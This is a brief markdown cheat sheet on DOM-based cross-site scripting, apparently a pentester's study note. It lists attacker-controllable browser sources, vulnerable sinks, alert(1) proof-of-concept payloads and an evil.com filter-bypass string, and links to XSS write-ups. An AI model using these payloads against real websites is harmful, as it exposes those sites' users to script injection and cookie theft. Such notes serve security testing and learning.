## Solution
- Debug to trace :
  - premise: input and output
  - then: trying to bypass strictions

## Input
Always check the code, figure out what can be controlled by user, and what these parameter can be used.
```
var value = '<%request.getparameter("key")%>';
var value = document.cookie, url;
var value = location.search.substr(6)

document.URL
document.documentURI
document.URLUnencoded
document.baseURI
location
document.cookie
document.referrer
window.name
history.pushState
history.replaceState
localStorage
sessionStorage
IndexedDB (mozIndexedDB, webkitIndexedDB, msIndexedDB)
Database
```

## output
```
<iframe src = javascript:alert(1)>
window.location.href = "javascript:alert(1)//"
document.write('<iframe src= ' + input + '>');
inside the script code: "><script>alert(1)</script>
iframeTag.setAttribute('src',input)
```
## Bypass
- regex
  - /\\/evil.com


## Other Type
- [Flash ExternalInterface.call() JavaScript Injection â€“ can make the websites vulnerable to XSS](https://soroush.secproject.com/blog/2011/03/flash-externalinterface-call-javascript-injection-%E2%80%93-can-make-the-websites-vulnerable-to-xss/)
- [postMessage XSS on a million sites](https://labs.detectify.com/2016/12/15/postmessage-xss-on-a-million-sites/)

## Referer
- [hacktricks](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/xss-cross-site-scripting/dom-xss.md)
